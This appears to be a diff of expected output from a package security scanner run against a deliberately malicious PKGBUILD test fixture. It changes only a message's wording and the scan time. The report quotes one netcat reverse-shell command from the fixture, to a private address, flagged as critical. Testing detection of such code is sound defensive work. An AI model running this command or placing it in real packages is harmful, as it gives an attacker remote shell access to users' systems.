@@ -10,7 +10,7 @@ Scan Results: malicious-reverse-shell
     Reference: CWE-506
 
 [CRITICAL] SHELL-002 Netcat reverse shell
-    Netcat with execute flag indicates reverse shell
+    Netcat with an execute flag indicates a reverse shell
     Location: tests/fixtures/malicious/reverse-shell/PKGBUILD:19
     Code:     nc -e /bin/sh 192.168.1.100 4444
     Recommendation: Remove reverse shell code immediately
@@ -30,7 +30,7 @@ Scan Results: malicious-reverse-shell
 
 ============================================================
 Package: malicious-reverse-shell v1.0.0-1
-Scan duration: 5ms
+Scan duration: 18ms
 
 Found 4 issue(s):
   2 CRITICAL
